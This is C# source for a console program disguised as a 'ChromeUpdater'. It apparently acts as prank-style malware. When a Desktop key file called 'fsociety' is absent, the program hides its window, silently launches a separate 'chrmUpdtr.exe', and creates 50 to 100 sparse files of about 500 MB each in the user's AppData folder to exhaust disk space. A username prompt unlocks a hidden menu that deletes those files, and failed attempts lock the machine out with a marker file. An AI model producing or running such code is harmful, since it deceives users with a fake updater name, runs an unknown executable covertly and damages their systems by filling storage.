using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace ChromeUpdater
{
    class Program
    {

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_SHOW);
            string isDenied = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\fsociety\start.txt";
            if (File.Exists(isDenied))
            {
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine("Your computer is denied!\nPress any key to exit.");
                Console.ForegroundColor = ConsoleColor.White;
                Console.ReadKey();
            }
            else
            {
                string DesktopFile = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\fsociety";
                if (File.Exists(DesktopFile))
                {
                    string DesktopFileText = System.IO.File.ReadAllText(DesktopFile);
                    int failed = 0, maxFails = 3;
                    do
                    {
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.Write("username: ");
                        Console.ForegroundColor = ConsoleColor.Red;
                        string WriteUsername = Console.ReadLine();
                        Console.ForegroundColor = ConsoleColor.White;

                        if (WriteUsername == DesktopFileText)
                        {
                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine("Successfully Login! Welcome.");
                            Console.ForegroundColor = ConsoleColor.White;
                            failed = 100;
                        }
                        else
                        {
                            if (failed == 0)
                            {
                                Console.ForegroundColor = ConsoleColor.DarkRed;
                                Console.WriteLine("Username don't match.");
                                failed++;
                                Console.ForegroundColor = ConsoleColor.White;
                            }
                            else
                            {
                                Console.ForegroundColor = ConsoleColor.DarkRed;
                                Console.WriteLine("Username don't match. {0} / {1} ", failed, maxFails);
                                failed++;
                                Console.ForegroundColor = ConsoleColor.White;

                            }
                        }
                    } while (failed <= maxFails);
                    if (failed != 100)
                    {
                        string DenyFile = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                        Directory.CreateDirectory(DenyFile + @"\fsociety");
                        File.Create(DenyFile + @"\fsociety\start.txt");
                    }
                    else
                    {
                        // ha sikeresen beléptél
                        bool logout = false;
                        do
                        {
                            Console.ForegroundColor = ConsoleColor.Gray;
                            Console.Write("> ");
                            Console.ForegroundColor = ConsoleColor.DarkGreen;
                            switch(Console.ReadLine())
                            {
                                case "logout":
                                    File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\fsociety");
                                    Environment.Exit(1);
                                    break;
                                case "exit":
                                    Console.ForegroundColor = ConsoleColor.White;
                                    Environment.Exit(1);
                                    break;

                                case "delfiles":
                                    {
                                        string fscty = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\fs";
                                        if (Directory.Exists(fscty))
                                        {
                                            //  int i = 0;
                                            //    for (i = 0; i < fscty.Length; i++)
                                            //   {
                                            //       File.Delete(fscty + @"\fscty" + i + ".txt");
                                            //     }                                       
                                            Directory.Delete(fscty, true);
                                            Console.ForegroundColor = ConsoleColor.Green;
                                            Console.WriteLine("Files were deleted successfully.");
                                        }
                                        else
                                        {
                                            Console.ForegroundColor = ConsoleColor.DarkRed;
                                            Console.WriteLine("Files not found.");
                                        }
                                    }
                                    break;

                                default:
                                    Console.ForegroundColor = ConsoleColor.DarkRed;
                                    Console.WriteLine("Unknown command.");
                                    break;

                            }
                        } while (logout == false);
                    }
                }
                else
                {
                    // ha nem létezik a fájl
                    ShowWindow(handle, SW_HIDE);
                    string fscty = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\fs";
                    Directory.CreateDirectory(fscty);
                    int i = 0;
                    Random r = new Random();
                    int n = r.Next(50, 101);
                 //   ShowWindow(handle, SW_HIDE);
                    string chrmUpdtr = Directory.GetCurrentDirectory() + @"\chrmUpdtr\chrmUpdtr.exe";
                    ProcessStartInfo startinfo = new ProcessStartInfo();
                    startinfo.FileName = chrmUpdtr;
                    startinfo.CreateNoWindow = true;
                    startinfo.UseShellExecute = true;
                    Process myProcess = Process.Start(startinfo);
                    //myProcess.Start();
                    int randomCount = 0;
                    for (i = 1; i < n + 1; i++)
                    {
                        randomCount = r.Next(1, Int32.MaxValue);
                        byte[] b = { 0, 1, 3 };
                        using (FileStream fs = new FileStream(fscty + @"\fscty" + randomCount + ".txt", FileMode.Create))
                            {
                                fs.Seek(524288000L, SeekOrigin.Begin);
                                fs.Write(b, 0, 3);
                                fs.Flush();
                            }
                        }
                    }
                ShowWindow(handle, SW_SHOW);
            }
        }
    }
}
